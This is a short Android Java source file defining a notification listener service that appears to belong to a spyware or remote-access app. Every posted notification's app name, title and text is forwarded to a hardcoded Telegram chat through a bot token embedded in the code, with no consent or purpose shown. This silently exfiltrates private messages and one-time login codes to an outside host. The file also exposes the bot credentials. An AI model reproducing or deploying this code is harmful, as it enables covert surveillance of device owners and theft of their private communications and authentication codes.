package com.alzahra.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.alzahra.telegram.TelegramBot;

public class NotificationService extends NotificationListenerService {

    private TelegramBot bot;
    private static final String CHAT_ID = "7344776596";

    @Override
    public void onCreate() {
        super.onCreate();
        bot = new TelegramBot("8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");

        if (title != null && text != null) {
            String notification = "🔔 <b>New Notification</b>\n\n" +
                    "From: " + packageName + "\n" +
                    "Title: " + title + "\n" +
                    "Text: " + text;

            bot.sendMessage(CHAT_ID, notification);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
